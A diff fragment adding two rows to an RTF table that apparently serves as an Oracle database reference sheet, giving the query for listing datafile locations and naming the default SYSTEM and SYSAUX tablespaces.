+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Location of DB files\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT name FROM V$DATAFILE;\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrt\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Default/System Databases\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SYSTEM\
+SYSAUX\cell \lastrow\row
+}
